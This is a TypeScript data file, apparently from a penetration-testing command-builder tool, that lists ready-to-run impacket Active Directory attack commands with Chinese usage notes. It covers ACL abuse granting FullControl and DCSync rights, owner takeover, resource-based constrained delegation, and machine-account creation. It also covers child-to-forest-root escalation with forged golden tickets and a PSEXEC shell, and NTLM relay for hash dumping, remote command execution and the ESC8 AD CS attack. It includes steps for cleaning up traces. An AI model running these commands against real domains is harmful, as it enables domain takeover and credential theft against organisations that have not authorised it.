import type { Profile, Tool } from '../../../types';
import { buildImpacketDomainAuth, q, v } from '../../../lib/auth';

/**
 * impacket AD 攻击类工具 (DACL/Owner/RBCD/机器账户/域提权/NTLM 中继)
 * 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples:
 * https://github.com/fortra/impacket/tree/master/examples
 *
 * dacledit/owneredit/rbcd/addcomputer 的 identity 位置参数为
 * domain.local/username[:password] (域身份，无 @host)，使用 buildImpacketDomainAuth；
 * 四者均支持 -hashes/-no-pass/-k/-aesKey/-dc-ip (dacledit/owneredit 另有 -dc-host)。
 * raiseChild 仅支持 -hashes/-no-pass/-k/-aesKey (无 -dc-ip)，单独构造。
 * ntlmrelayx 是中继监听端，无认证位置参数，直接用 v() 拼接。
 */

const EMPTY_LM_HASH = 'aad3b435b51404eeaad3b435b51404ee';

/**
 * raiseChild.py 的 target 为 domain/username[:password]，
 * 认证参数只有 -hashes/-no-pass/-k/-aesKey (无 -dc-ip/-dc-host/-target-ip)。
 */
function buildRaiseChildAuth(p: Profile): string {
  const domain = v(p.domain, 'DOMAIN');
  const user = v(p.username, 'USER');

  switch (p.authMode) {
    case 'password':
      return `${domain}/${user}:${q(v(p.password, 'PASSWORD'))}`;
    case 'hash': {
      const lm = p.lmHash?.trim() || EMPTY_LM_HASH;
      return `${domain}/${user} -hashes ${lm}:${v(p.ntHash, 'NTHASH')}`;
    }
    case 'kerberos':
      return `${domain}/${user} -k -no-pass`;
    case 'aeskey':
      return `${domain}/${user} -aesKey ${v(p.aesKey, 'AESKEY')} -k`;
  }
}

export const impacketAdAttackTools: Tool[] = [
  {
    id: 'dacledit',
    name: 'impacket-dacledit',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/dacledit.py',
    description: '读取/备份/恢复/修改 AD 对象的 DACL (写 FullControl/DCSync 等 ACE)',
    commands: [
      {
        id: 'dacledit-read',
        title: '读取目标对象 DACL',
        description: '-action read 打印目标对象 DACL，可用 -principal 过滤特定主体的 ACE',
        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action read -target ${v('', 'TARGET')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份；域名部分用于定位 DC
-action read: 读取目标对象的 DACL (默认动作)
-target NAME: 目标对象的 sAMAccountName；也可用 -target-sid SID 或 -target-dn DN 指定
-principal NAME: 可选，只显示该主体相关的 ACE；也可用 -principal-sid / -principal-dn
-hashes LMHASH:NTHASH: 使用 NTLM 哈希认证 (此时 identity 中可省略密码)
-k -no-pass: Kerberos 认证，从 KRB5CCNAME 指定的 ccache 读取票据
-aesKey hex key -k: 使用 AES(128/256) 密钥做 Kerberos 认证
-dc-ip / -dc-host: 指定域控/KDC 的 IP 或主机名 (省略时用 identity 中的域 FQDN)
-use-ldaps: 使用 LDAPS 代替 LDAP`,
        example: `impacket-dacledit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action read -target Domain\\ Admins`,
      },
      {
        id: 'dacledit-backup',
        title: '备份目标对象 DACL',
        description: '-action backup 将 DACL 序列化保存到文件，供修改后恢复',
        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action backup -target ${v('', 'TARGET')} -file ${v(p.fileName, 'BACKUP.json')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action backup: 备份目标对象的 DACL 到文件
-target NAME: 目标对象的 sAMAccountName；也可用 -target-sid / -target-dn
-file FILENAME: 备份文件路径 (对 backup 为可选，省略时自动生成；对 restore 为必填)
-hashes LMHASH:NTHASH: NTLM 哈希认证
-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名
-use-ldaps: 使用 LDAPS 代替 LDAP`,
        example: `impacket-dacledit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action backup -target Administrator -file admin_dacl.json`,
      },
      {
        id: 'dacledit-restore',
        title: '恢复目标对象 DACL',
        description: '-action restore 从备份文件恢复 DACL，用于攻击后清理痕迹',
        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action restore -target ${v('', 'TARGET')} -file ${v(p.fileName, 'BACKUP.json')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action restore: 从备份文件恢复目标对象的 DACL
-target NAME: 目标对象的 sAMAccountName；也可用 -target-sid / -target-dn
-file FILENAME: 之前用 -action backup 生成的备份文件 (restore 时必填)
-hashes LMHASH:NTHASH: NTLM 哈希认证
-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名
-use-ldaps: 使用 LDAPS 代替 LDAP`,
        example: `impacket-dacledit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action restore -target Administrator -file admin_dacl.json`,
      },
      {
        id: 'dacledit-write-fullcontrol',
        title: '写入 FullControl ACE',
        description: '-action write -rights FullControl 授予主体对目标的完全控制权',
        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action write -rights FullControl -principal ${v(p.username, 'USER')} -target ${v('', 'TARGET')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action write: 在目标 DACL 中新增 ACE
-principal NAME: ACE 授予的主体 (攻击者控制的账户, sAMAccountName)；也可用 -principal-sid / -principal-dn
-target NAME: 被修改 DACL 的目标对象；也可用 -target-sid / -target-dn
-rights: 权限类型，可选 FullControl/ResetPassword/WriteMembers/DCSync/Custom (默认 FullControl)
-ace-type: ACE 类型 allowed/denied (默认 allowed)
-inheritance: 在 ACE 标志中启用继承 (CONTAINER_INHERIT_ACE/OBJECT_INHERIT_ACE)，
  目标为容器或 OU 时 ACE 会被其中对象继承 (adminCount=1 的对象除外)
-hashes/-k -no-pass/-aesKey -k: 认证方式；-dc-ip/-dc-host 指定 DC；-use-ldaps 走 LDAPS`,
        example: `impacket-dacledit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action write -rights FullControl -principal lowuser -target Administrator`,
      },
      {
        id: 'dacledit-write-dcsync',
        title: '写入 DCSync 权限',
        description: '-rights DCSync 授予主体复制权限 (DS-Replication-Get-Changes[-All])，可对域对象 DCSync',
        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action write -rights DCSync -principal ${v(p.username, 'USER')} -target-dn ${v('', 'DC=DOMAIN,DC=LOCAL')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action write: 在目标 DACL 中新增 ACE
-rights DCSync: 写入复制权限组合，之后可用 secretsdump -just-dc 执行 DCSync
-principal NAME: 被授予权限的主体 (攻击者控制的账户)
-target-dn DN: DCSync 权限需写在域根对象上，用 DN 指定 (如 DC=corp,DC=local)
-rights-guid RIGHTS_GUID: 需要精确控制时可手动指定权限 GUID (替代 -rights)
-mask [MASK]: 强制访问掩码 (readwrite/write/self/allext/0xXXXXX)，配合 -rights Custom 或 -rights-guid
-hashes/-k -no-pass/-aesKey -k: 认证方式；-dc-ip/-dc-host 指定 DC；-use-ldaps 走 LDAPS`,
        example: `impacket-dacledit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action write -rights DCSync -principal lowuser -target-dn DC=corp,DC=local`,
      },
      {
        id: 'dacledit-remove',
        title: '移除 ACE (清理)',
        description: '-action remove 删除目标 DACL 中指定主体与权限的 ACE',
        build: (p) => `impacket-dacledit ${buildImpacketDomainAuth(p)} -action remove -rights FullControl -principal ${v(p.username, 'USER')} -target ${v('', 'TARGET')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action remove: 从目标 DACL 中移除匹配主体与权限的 ACE
-principal NAME: 要移除 ACE 的主体 (攻击者控制的账户)
-target NAME: 目标对象；也可用 -target-sid / -target-dn
-rights: 要移除的权限类型 (FullControl/ResetPassword/WriteMembers/DCSync/Custom)，需与写入时一致
-ace-type: ACE 类型 allowed/denied (默认 allowed)，需与写入时一致
-hashes/-k -no-pass/-aesKey -k: 认证方式；-dc-ip/-dc-host 指定 DC；-use-ldaps 走 LDAPS`,
        example: `impacket-dacledit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action remove -rights FullControl -principal lowuser -target Administrator`,
      },
    ],
  },
  {
    id: 'owneredit',
    name: 'impacket-owneredit',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/owneredit.py',
    description: '读取/修改 AD 对象的 Owner (夺取所有权后可改写其 DACL)',
    commands: [
      {
        id: 'owneredit-read',
        title: '读取目标对象 Owner',
        description: '-action read 打印目标对象当前的所有者',
        build: (p) => `impacket-owneredit ${buildImpacketDomainAuth(p)} -action read -target ${v('', 'TARGET')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份；域名部分用于定位 DC
-action read: 读取目标对象的 Owner 属性
-target NAME: 目标对象的 sAMAccountName；也可用 -target-sid SID 或 -target-dn DN 指定
-hashes LMHASH:NTHASH: 使用 NTLM 哈希认证 (identity 中可省略密码)
-k -no-pass: Kerberos 认证，从 KRB5CCNAME 读取 ccache
-aesKey hex key -k: 使用 AES(128/256) 密钥做 Kerberos 认证
-dc-ip / -dc-host: 指定域控/KDC 的 IP 或主机名
-use-ldaps: 使用 LDAPS 代替 LDAP`,
        example: `impacket-owneredit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action read -target Domain\\ Admins`,
      },
      {
        id: 'owneredit-write',
        title: '修改目标对象 Owner',
        description: '-action write 将目标对象所有者改为攻击者控制的账户 (需要 WriteOwner 权限)',
        build: (p) => `impacket-owneredit ${buildImpacketDomainAuth(p)} -action write -new-owner ${v(p.username, 'USER')} -target ${v('', 'TARGET')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action write: 修改目标对象的 Owner 属性
-new-owner NAME: 新所有者 (攻击者控制的账户, sAMAccountName)；也可用 -new-owner-sid / -new-owner-dn
-target NAME: 目标对象；也可用 -target-sid / -target-dn
说明: 成为 Owner 后即隐式拥有 WRITE_DAC 权限，可配合 dacledit 写入 FullControl ACE
-hashes LMHASH:NTHASH: NTLM 哈希认证
-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名；-use-ldaps 走 LDAPS`,
        example: `impacket-owneredit corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action write -new-owner lowuser -target Domain\\ Admins`,
      },
    ],
  },
  {
    id: 'rbcd',
    name: 'impacket-rbcd',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/rbcd.py',
    description: '读取/修改 msDS-AllowedToActOnBehalfOfOtherIdentity，配置基于资源的约束委派 (RBCD)',
    commands: [
      {
        id: 'rbcd-read',
        title: '读取目标账户 RBCD 配置',
        description: '-action read 查看目标账户当前允许哪些账户委派',
        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action read -delegate-to ${v('', 'TARGET$')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份；域名部分用于定位 DC
-action read: 读取目标账户的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性
-delegate-to ACCOUNT: 被读取/修改 RBCD 属性的目标账户 (必填，通常是机器账户如 SRV01$)
-hashes LMHASH:NTHASH: 使用 NTLM 哈希认证 (identity 中可省略密码)
-k -no-pass: Kerberos 认证，从 KRB5CCNAME 读取 ccache
-aesKey hex key -k: 使用 AES(128/256) 密钥做 Kerberos 认证
-dc-ip / -dc-host: 指定域控/KDC 的 IP 或主机名
-use-ldaps: 使用 LDAPS 代替 LDAP`,
        example: `impacket-rbcd corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action read -delegate-to 'SRV01$'`,
      },
      {
        id: 'rbcd-write',
        title: '写入 RBCD (委派攻击)',
        description: '-action write 允许攻击者控制的账户委派到目标，之后用 getST -impersonate 取票据',
        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action write -delegate-to ${v('', 'TARGET$')} -delegate-from ${v('', 'EVIL$')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份 (需对目标有写权限)
-action write: 在目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 中加入委派账户
-delegate-to ACCOUNT: 被配置 RBCD 的目标账户 (必填，如被控机器 SRV01$)
-delegate-from ACCOUNT: 攻击者控制的账户 (仅 -action write 时使用)，
  通常是用 addcomputer 新建的机器账户，之后用它 getST -spn cifs/SRV01 -impersonate administrator
-hashes LMHASH:NTHASH: NTLM 哈希认证
-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名；-use-ldaps 走 LDAPS`,
        example: `impacket-rbcd corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action write -delegate-to 'SRV01$' -delegate-from 'EVILPC$'`,
      },
      {
        id: 'rbcd-remove',
        title: '移除 RBCD 配置 (清理)',
        description: '-action remove 从目标 RBCD 属性中删除指定委派账户',
        build: (p) => `impacket-rbcd ${buildImpacketDomainAuth(p)} -action remove -delegate-to ${v('', 'TARGET$')} -delegate-from ${v('', 'EVIL$')}`,
        usage: `位置参数 identity: domain.local/username[:password]，认证身份
-action remove: 从目标 RBCD 属性中移除 -delegate-from 指定的账户
-delegate-to ACCOUNT: 目标账户 (必填)
-delegate-from ACCOUNT: 要移除的委派账户
-action flush: (另一取值) 清空目标整个 RBCD 属性，不指定 -delegate-from
-hashes LMHASH:NTHASH: NTLM 哈希认证
-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名；-use-ldaps 走 LDAPS`,
        example: `impacket-rbcd corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action remove -delegate-to 'SRV01$' -delegate-from 'EVILPC$'`,
      },
    ],
  },
  {
    id: 'addcomputer',
    name: 'impacket-addcomputer',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/addcomputer.py',
    description: '在域中添加/删除机器账户 (利用 MachineAccountQuota，常用于 RBCD 攻击)',
    commands: [
      {
        id: 'addcomputer-add-ldaps',
        title: '添加机器账户 (LDAPS)',
        description: '-method LDAPS 经 LDAPS 创建机器账户，可自定义名称与密码',
        build: (p) => `impacket-addcomputer ${buildImpacketDomainAuth(p)} -method LDAPS -computer-name ${v('', 'COMPUTER$')} -computer-pass ${v('', 'PASSWORD')}`,
        usage: `位置参数 [domain/]username[:password]: 用于认证 DC 的账户 (普通域用户即可，受 MachineAccountQuota 限制)
-method {SAMR,LDAPS}: 添加方式；LDAPS 走 636 端口，有证书要求，不总是可用
-computer-name NAME$: 要创建的机器账户名 (需以 $ 结尾；省略时随机生成 DESKTOP-XXXXXXXX)
-computer-pass PASS: 机器账户密码 (省略时随机生成 32 位)
-baseDN: LDAP 查询根 (省略时用账户参数中的域 FQDN 推导)
-computer-group: 机器账户加入的容器 (默认 CN=Computers)
-domain-netbios: 域 NetBIOS 名 (DC 上有多个域时必填)
-hashes LMHASH:NTHASH: NTLM 哈希认证；-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名`,
        example: `impacket-addcomputer corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -method LDAPS -computer-name 'EVILPC$' -computer-pass 'EvilPass123!'`,
      },
      {
        id: 'addcomputer-add-samr',
        title: '添加机器账户 (SAMR)',
        description: '-method SAMR 经 SMB (139/445) 创建机器账户，兼容性更好',
        build: (p) => `impacket-addcomputer ${buildImpacketDomainAuth(p)} -method SAMR -computer-name ${v('', 'COMPUTER$')} -computer-pass ${v('', 'PASSWORD')}`,
        usage: `位置参数 [domain/]username[:password]: 用于认证 DC 的账户
-method SAMR: 通过 SAMR 协议 (走 SMB，默认 445 端口) 添加机器账户
-port {139,445,636}: 目标端口 (SAMR 默认 445，LDAPS 默认 636)
-computer-name NAME$: 机器账户名 (省略时随机生成)
-computer-pass PASS: 机器账户密码 (省略时随机生成)
-no-add: 不新建机器账户，仅重置已存在账户的密码
-hashes LMHASH:NTHASH: NTLM 哈希认证；-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名`,
        example: `impacket-addcomputer corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -method SAMR -computer-name 'EVILPC$' -computer-pass 'EvilPass123!'`,
      },
      {
        id: 'addcomputer-delete',
        title: '删除机器账户 (清理)',
        description: '-delete 删除已有机器账户，攻击结束后清理',
        build: (p) => `impacket-addcomputer ${buildImpacketDomainAuth(p)} -method LDAPS -computer-name ${v('', 'COMPUTER$')} -delete`,
        usage: `位置参数 [domain/]username[:password]: 用于认证 DC 的账户
-delete: 删除已存在的机器账户
-computer-name NAME$: 要删除的机器账户名
-method {SAMR,LDAPS}: 删除使用的协议 (SAMR 走 SMB 445，LDAPS 走 636)
-hashes LMHASH:NTHASH: NTLM 哈希认证；-k -no-pass / -aesKey hex key -k: Kerberos 认证
-dc-ip / -dc-host: 指定域控 IP 或主机名`,
        example: `impacket-addcomputer corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -method LDAPS -computer-name 'EVILPC$' -delete`,
      },
    ],
  },
  {
    id: 'raiseChild',
    name: 'impacket-raiseChild',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/raiseChild.py',
    description: '利用域信任从子域提权到林根域 (child2root，自动 forge 黄金票据)',
    commands: [
      {
        id: 'raisechild-golden',
        title: '子域到林根提权 (黄金票据)',
        description: '用子域 DA 凭据自动获取林根 Enterprise Admin 黄金票据并导出哈希',
        build: (p) => `impacket-raiseChild ${buildRaiseChildAuth(p)}`,
        usage: `位置参数 target: 子域的 domain/username[:password]，需要子域管理员权限
原理: 通过子域 DC 获取 krbtgt 与信任密钥，伪造带林根 Enterprise Admins SID 的黄金票据，
  进而对林根 DC 执行 DCSync 导出凭据
-targetRID RID: 要导出凭据的目标用户 RID (默认 500 即 Administrator)
-w pathname: 将黄金票据以 CCache 格式写入指定文件
-hashes LMHASH:NTHASH: 使用子域管理员的 NTLM 哈希认证 (target 中可省略密码)
-k -no-pass: Kerberos 认证，从 KRB5CCNAME 读取 ccache
-aesKey hex key -k: 使用 AES(128/256) 密钥做 Kerberos 认证
注意: 该脚本无 -dc-ip/-dc-host 参数，需保证子域 FQDN 可解析`,
        example: `impacket-raiseChild child.corp.local/administrator:'Passw0rd!'`,
      },
      {
        id: 'raisechild-psexec',
        title: '提权后直接 PSEXEC 林根 DC',
        description: '-target-exec 在攻击完成后自动对指定主机执行 PSEXEC 获取 shell',
        build: (p) => `impacket-raiseChild ${buildRaiseChildAuth(p)} -target-exec ${v(p.dcFQDN || p.dcIP, 'ROOT_DC')} -w ${v(p.ccachePath, 'admin.ccache')}`,
        usage: `位置参数 target: 子域的 domain/username[:password]，需要子域管理员权限
-target-exec ADDRESS: 主攻击完成后对其 PSEXEC 的目标主机 (通常为林根 DC)
-w pathname: 将黄金票据以 CCache 格式写入指定文件 (可配合 KRB5CCNAME 使用)
-targetRID RID: 要导出凭据的目标用户 RID (默认 500)
-hashes LMHASH:NTHASH: NTLM 哈希认证
-k -no-pass / -aesKey hex key -k: Kerberos 认证
注意: 该脚本无 -dc-ip/-dc-host 参数，需保证子域 FQDN 可解析`,
        example: `impacket-raiseChild child.corp.local/administrator:'Passw0rd!' -target-exec dc01.corp.local -w admin.ccache`,
      },
    ],
  },
  {
    id: 'ntlmrelayx',
    name: 'impacket-ntlmrelayx',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py',
    description: 'NTLM 中继核心工具：监听 SMB/HTTP 等协议并将认证中继到指定目标执行攻击',
    commands: [
      {
        id: 'ntlmrelayx-smb-dump',
        title: '中继到 SMB 导出哈希',
        description: '默认动作：中继成功后自动 dump 目标 SAM/LSA 哈希 (需要中继账户有目标管理员权限)',
        build: (p) => `impacket-ntlmrelayx --no-http-server -smb2support -t ${v(p.targetIP, 'TARGET_IP')}`,
        usage: `本工具是监听端，无认证位置参数；通常配合 Responder/PrinterBug/PetitPotam 触发认证
-t, --target TARGET: 中继目标，可以是 IP、主机名或 URL (如 smb://10.0.0.5、ldaps://dc)；
  省略时会尝试中继回发起认证的客户端自身 (多数情况受签名保护而失败)
-smb2support: 启用 SMB2 支持 (目标为新版 Windows 时必需)
SMB 中继且未指定 -c/-e 时，默认导出目标哈希 (需要 secretsdump.py 在同目录)
-l, --lootdir DIR: SAM dump 等战利品存放目录 (默认当前目录)
--no-http-server: 禁用 HTTP 监听 (此处只保留 SMB 监听)；同理有 --no-smb-server 等
-6, --ipv6: 监听 IPv6；-ip IP: 指定监听接口 IP`,
        example: `impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.5`,
      },
      {
        id: 'ntlmrelayx-smb-command',
        title: '中继到 SMB 执行命令',
        description: '-c 在中继成功的目标上执行单条命令 (需要目标管理员权限)',
        build: (p) => `impacket-ntlmrelayx --no-http-server -smb2support -t ${v(p.targetIP, 'TARGET_IP')} -c "${v('', 'COMMAND')}"`,
        usage: `-t TARGET: 中继目标 (IP/主机名/URL)
-smb2support: 启用 SMB2 支持
-c COMMAND: 中继成功后在目标系统执行的命令 (仅 SMB 和 RPC 客户端)；
  SMB 下未指定 -c/-e 时默认 dump 哈希
-e FILE: (替代 -c) 上传并在目标上执行本地文件
-i, --interactive: (替代 -c) 中继成功后启动交互式 smbclient/LDAP/SQL 控制台，
  监听本地 TCP 端口，可用 netcat 连接
-codec CODEC: 目标输出编码 (默认 utf-8，乱码时按 chcp.com 结果调整)`,
        example: `impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.5 -c "whoami /all"`,
      },
      {
        id: 'ntlmrelayx-socks',
        title: '多目标中继 + SOCKS 代理',
        description: '-tf 目标列表 + -socks 建立 SOCKS 代理，中继的会话可反复利用',
        build: (p) => `impacket-ntlmrelayx --no-http-server -smb2support -tf ${v(p.fileName, 'targets.txt')} -socks`,
        usage: `-tf FILE: 目标列表文件，每行一个主机名或完整 URL
-w: 监视目标文件变化，自动更新目标列表 (仅与 -tf 配合)
-ra, --random: 随机选择中继目标 (默认按列表顺序)
--no-multirelay: 禁用多主机中继 (SMB/HTTP 服务器)
--keep-relaying: 即使某目标已成功中继仍继续向其 relay
-socks: 为中继成功的连接启动 SOCKS5 代理，之后可 proxychains secretsdump.py 等复用会话
-socks-address / -socks-port: SOCKS5 监听地址与端口
--remove-mic: 移除 MIC (利用 CVE-2019-1040)，可绕过部分签名校验中继到 LDAP`,
        example: `impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt -socks`,
      },
      {
        id: 'ntlmrelayx-ldap-delegate',
        title: '中继到 LDAP 配置 RBCD 委派',
        description: '--delegate-access 在机器账户中继到 DC LDAP 时自动配置委派，配合 --remove-mic 绕过签名',
        build: (p) => `impacket-ntlmrelayx -t ldaps://${v(p.dcIP, 'DC_IP')} --remove-mic --delegate-access -smb2support`,
        usage: `-t ldaps://DC: 中继目标为 DC 的 LDAP/LDAPS (机器账户中继场景)
--delegate-access: 为中继的机器账户配置基于资源的约束委派 (RBCD)，
  自动创建机器账户并授予其对被中继机器的委派权限
--sid: 委派时使用 SID 而不是账户名
--escalate-user USER: (替代) 不创建新用户，直接提升指定用户的权限 (ACL 攻击)
--no-dump: 不 dump LDAP 信息；--no-da: 不尝试添加域管；--no-acl: 禁用 ACL 攻击
--remove-mic: 移除 MIC (CVE-2019-1040)，SMB 中继到 LDAP 时常需要
-smb2support: 启用 SMB2 监听支持`,
        example: `impacket-ntlmrelayx -t ldaps://10.0.0.10 --remove-mic --delegate-access -smb2support`,
      },
      {
        id: 'ntlmrelayx-ldap-escalate',
        title: '中继到 LDAP 提升指定用户 (DCSync)',
        description: '--escalate-user 通过 ACL 攻击赋予指定用户 DCSync 权限',
        build: (p) => `impacket-ntlmrelayx -t ldap://${v(p.dcIP, 'DC_IP')} --escalate-user ${v(p.username, 'USER')} -smb2support`,
        usage: `-t ldap://DC: 中继目标为 DC 的 LDAP (需中继有写权限的账户)
--escalate-user USER: 通过 ACL 攻击提升该用户权限 (授予 DCSync 复制权限)，
  而不是默认的创建新域管账户
--no-validate-privs: 不枚举权限，直接假定有权限执行 ACL 提权
--no-da: 不尝试添加 Domain Admin；--no-acl: 禁用 ACL 攻击；--no-dump: 不 dump LDAP
--dump-laps / --dump-gmsa / --dump-adcs: 顺带 dump LAPS/gMSA/ADCS 信息
--add-computer [NAME [PASS]]: 经 LDAP 或 SMB 添加机器账户 (目标须为 DC)
--add-dns-record NAME IP: 经 LDAP 添加 DNS 记录`,
        example: `impacket-ntlmrelayx -t ldap://10.0.0.10 --escalate-user lowuser -smb2support`,
      },
      {
        id: 'ntlmrelayx-adcs',
        title: '中继到 AD CS Web 注册 (ESC8)',
        description: '--adcs 中继到证书注册接口申请证书，中继 DC 机器账户时指定 DomainController 模板',
        build: (p) => `impacket-ntlmrelayx -t http://${v(p.targetIP, 'CA_IP')}/certsrv/certfnsh.asp --adcs --template ${v(p.certTemplate, 'DomainController')} -smb2support`,
        usage: `-t http://CA/certsrv/certfnsh.asp: 中继目标为 AD CS Web 注册接口 (ESC8)
--adcs: 启用 AD CS 中继攻击
--template TEMPLATE: 证书模板；按中继账户名是否以 $ 结尾默认 Machine 或 User，
  中继 DC 机器账户 (如配合 PetitPotam 强制 DC 认证) 需指定 DomainController
--altname NAME: ESC1/ESC6 场景使用的 Subject Alternative Name
--shadow-credentials: (替代) Shadow Credentials 攻击，修改目标 msDS-KeyCredentialLink
--shadow-target ACCOUNT: Shadow Credentials 的目标账户 (用户或 computer$)
拿到 DC 证书后可用 PKINIT (gettgtpkinit/certipy) 换取 TGT 并 DCSync`,
        example: `impacket-ntlmrelayx -t http://10.0.0.20/certsrv/certfnsh.asp --adcs --template DomainController -smb2support`,
      },
    ],
  },
];
